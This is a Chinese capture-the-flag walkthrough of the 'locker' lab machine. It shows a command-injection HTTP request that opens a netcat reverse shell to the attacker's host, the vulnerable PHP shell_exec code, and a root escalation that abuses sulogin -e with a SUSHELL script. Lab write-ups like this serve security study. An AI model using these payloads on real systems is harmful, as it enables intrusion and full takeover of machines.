### 端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.115
```

```bash
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CA:9E:2A (Oracle VirtualBox virtual NIC)
```

### web渗透

![image-20241013212206263](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013212206263.png)

开始反弹shell

```http
GET /locker.php?image=;nc 192.168.56.101 1234 -e /bin/bash; HTTP/1.1
Host: 192.168.56.115
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

一开始以为是文件读取，哈哈

### 提权

```bash
(remote) www-data@locker:/var/www/html# cat locker.php 
<?php
$image = $_GET['image'];
$command = "cat ".$image.".jpg | base64";
$output = shell_exec($command);
print'<img src="data:image/jpg;base64,'.$output.'"width="150"height="150"/>';
?>
```

```bash
(remote) www-data@locker:/var/www/html# find / -type f -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/sulogin
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
```

`sulogin`是特殊的

```bash
(remote) www-data@locker:/tmp$ sulogin 

Cannot open access to console, the root account is locked.
See sulogin(8) man page for more details.

Press Enter to continue.
```

`root`的账户被锁定

查看`sulogin`的手册

```
NAME
       sulogin - single-user login

SYNOPSIS
       sulogin [options] [tty]

DESCRIPTION
       sulogin is invoked by init when the system goes into single-user mode.

       The user is prompted:

            Give root password for system maintenance
            (or type Control-D for normal startup):

       If the root account is locked and --force is specified, no password is required.

OPTIONS
       -e, --force
              If  the  default method of obtaining the root password from the system via getpwnam(3) fails, then examine /etc/passwd and /etc/shadow to get the pass-
              word.  If these files are damaged or nonexistent, or when root account is locked by '!' or '*' at the begin of the password then sulogin will  start  a
              root shell without asking for a password.

ENVIRONMENT VARIABLES
       sulogin  looks  for the environment variable SUSHELL or sushell to determine what shell to start.  If the environment variable is not set, it will try to exe-
       cute root's shell from /etc/passwd.  If that fails, it will fall back to /bin/sh.
```

当`root`的账户被锁定，我们可以使用`-e`选项，不用输入密码就进入root的shell

`sulogin`在单用户登录会查看`SUSHELL环境变量`,并且根据SUSHELL变量打开指定shell

我们利用python，写一个小的脚本

```python
#!/usr/bin/python3

import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
```

```bash
(remote) www-data@locker:/tmp$ cat s
#!/usr/bin/python3

import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
(remote) www-data@locker:/tmp$ chmod 777 s
(remote) www-data@locker:/tmp$ export SUSHELL=/tmp/s
(remote) www-data@locker:/tmp$ echo $SUSHELL
/tmp/s
(remote) www-data@locker:/tmp$ sulogin -e
Press Enter for maintenance
(or press Control-D to continue): 
root@locker:~# ls
flag.sh  root.txt
```

#### user‘s flag

```bash
root@locker:/home/tolocker# cat user.txt 
flaglockeryes
```

#### root's flag

```bash
root@locker:/home/tolocker# cat /root/root.txt 
igotroothere
```

